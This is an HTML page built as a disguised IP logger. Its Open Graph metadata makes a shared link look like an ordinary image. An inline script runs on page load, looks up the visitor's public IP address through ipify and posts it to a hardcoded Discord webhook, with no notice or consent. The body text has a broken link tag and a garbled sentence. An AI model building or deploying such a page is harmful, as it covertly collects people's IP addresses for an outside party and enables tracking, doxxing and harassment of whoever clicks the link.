<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>IP Logger and Image</title>

    <meta property="og:title" content="Image" />
    <meta property="og:description" content=" " />
    <meta property="og:image" content="https://i.imgur.com/i12zp3X.png" />
    <meta property="og:type" content="image/png" />

    <script>
        const webhookURL = "https://discordapp.com/api/webhooks/1317895579828748308/ni9_3dstKqP9xLi-AQglTGZErQ26PbOoNj_kd1F";

        async function logIP() {
            try {
                const response = await fetch("https://api.ipify.org?format=json");
                const data = await response.json();

                await fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ ip_address: data.ip })
                });
            } catch (error) {
                console.error("Failed to log IP address: ", error);
            }
        }

        logIP();
    </script>
</head>
<body>
    <p>The IP address has been logged. Check the <a href="https://discordapp.com/account name and the server</a> clicked the link in my webhook.

</body>
</html>
